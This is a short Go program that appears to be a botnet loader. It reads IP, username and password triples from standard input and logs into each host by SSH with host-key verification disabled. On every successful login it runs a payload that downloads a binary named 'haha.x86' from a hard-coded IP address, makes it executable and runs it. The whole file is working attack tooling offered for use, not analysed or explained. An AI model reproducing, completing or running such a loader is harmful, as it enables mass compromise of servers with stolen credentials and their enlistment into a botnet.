package main
 
import
(
    "golang.org/x/crypto/ssh"
    "os"
    "strings"
    "sync"
    "bufio"
    "fmt"
 
)
 
var payload = "wget http://74.201.28.102/skullnet/haha.x86; chmod 777 haha.x86; ./haha.x86 shell"
var group sync.WaitGroup
var ips = 0
 
func high(address string, password string, username string) {
 
    sshConfig := &ssh.ClientConfig{
        User: username,
        Auth: []ssh.AuthMethod{
            ssh.Password(password)},
        HostKeyCallback: ssh.InsecureIgnoreHostKey(),
        
    }
    
    fmt.Printf("\x1b[31m[%s:22:%s:%s] Attempting\n", address, username, password)
    
    connection, err := ssh.Dial("tcp", fmt.Sprintf("%s:%d", address, 22), sshConfig)
    if err != nil {
        group.Done()
        return
    }
    fmt.Printf("\x1b[32m[%s:22:%s:%s] LOADING!!!\n", address, username, password)
 
        session, err := connection.NewSession()
        if err != nil {
            fmt.Printf("[ERROR] Failed to create session err : %s\n", err)
            group.Done()
            return
        }   
    
        modes := ssh.TerminalModes{
            ssh.ECHO:          0,     
            ssh.TTY_OP_ISPEED: 14400,
            ssh.TTY_OP_OSPEED: 14400,
        }
    
        if err := session.RequestPty("xterm", 80, 40, modes); err != nil {
            session.Close()
            fmt.Printf("[ERROR] request for pseudo terminal failed: %s\n", err)
            group.Done()
            return
        }
        
        
        session.Run("bash\r\nenable\r\nsh\r\nsystem\r\n")
 
        session.Run(payload)
        
        session.Close()
        group.Done()
        return
}
 
 
func main() {
 
    for {
        reader := bufio.NewReader(os.Stdin)
        address := bufio.NewScanner(reader)
        for address.Scan() {
                ip := strings.Split(address.Text(), ":") 
                ips++
                group.Add(1)
                go high(ip[0], ip[2], ip[1])    
                    
        }
                
    }
}